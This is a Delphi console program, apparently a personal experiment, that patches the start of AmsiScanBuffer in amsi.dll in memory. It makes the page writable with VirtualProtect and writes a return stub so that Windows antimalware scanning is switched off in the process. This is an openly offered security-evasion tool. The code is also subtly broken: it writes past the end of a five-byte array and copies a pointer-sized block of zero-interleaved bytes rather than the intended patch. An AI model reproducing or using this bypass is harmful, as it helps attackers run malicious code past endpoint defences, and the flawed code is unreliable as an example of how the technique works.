program BasedAmsi_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
https://delphi.cjcsoft.net/viewthread.php?tid=42761&extra=page%3D1
https://www.askingbox.com/tip/delphi-lazarus-show-byte-array-as-string-of-hex-values
}

uses
  System.SysUtils,
  Windows
  ;


type
  TByteArr = array of Byte;

var
  PidHandle: integer;
  PidID : integer;
  Written: UIntPtr;
  lib : THandle;
  asb : Pointer;
  NumWrote : SIZE_T;
  //OldProtect : DWord;
  OldProtect : DWord;               //1       //3       //5       //7       //9       //11
  PH : array[0..11] of Byte = ($00, $B8, $00, $57, $00, $00, $00, $07, $00, $80, $00, $C3);
  //1,3,5,7,9
  BA: TByteArr;




//Add bps
//Step to load
//Save bin of amsi.dll in memory
//Step past Protect,Patch,ReProtect
//Save bin of amsi.dll in memory
//$(cmp pre-patch.bin post-patch.bin)

function ByteArrayToHexString(BA: TByteArr; Sep: string = ''): string;
var
  i, k: integer;
begin
  result:='';

  if Sep='' then begin
     for i:=low(BA) to high(BA) do
       result := result + IntToHex(BA[i], 2);
  end else begin
     k:=high(BA);
     for i:=low(BA) to k do begin
        result:= result + IntToHex(BA[i], 2);
        if k<>i then result := result + Sep;
     end;
  end;
end;


begin
  try
  //Load and get base address for AmsScanBuffer
    lib := LoadLibrary('amsi.dll');
    asb := GetProcAddress(lib,'AmsiScanBuffer');
    WriteLn(Format('[+] amsi.dll base address: %p',[asb]));
    // dll base address at  0000-7FF9-E16E-35E0
    // SSB Loaded at        0000-0000-0000-25e0
    // inside RX region of 2nd image


  //Change mem prot to R&W&X
    WriteLn('[+] Attempting to change protections');
    VirtualProtect(asb, 1, 64, OldProtect);
    WriteLn('[+] RWX protected');

  //Write to memory @ pter
    //1       //3       //5       //7       //9       //11
    SetLength(BA,5);
    BA[0] := PH[1];
    BA[1] := PH[3];
    BA[2] := PH[5];
    BA[3] := PH[7];
    BA[4] := PH[9];
    BA[5] := PH[11];

    WriteLn('[+] Pat with PH ', ByteArrayToHexString(BA,' '), ' of length ', SizeOf(PH));
    Move(PH, asb^, SizeOf(BA));
    WriteLn('[+] Written RET To the start of ScanStringBuffer');

  //Change memory protection to RX
    VirtualProtect(asb, 1, OldProtect, OldProtect);
    //VirtualProtect(asb, 1, 4, 0);
    WriteLn('[+] RX prot applied');


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.

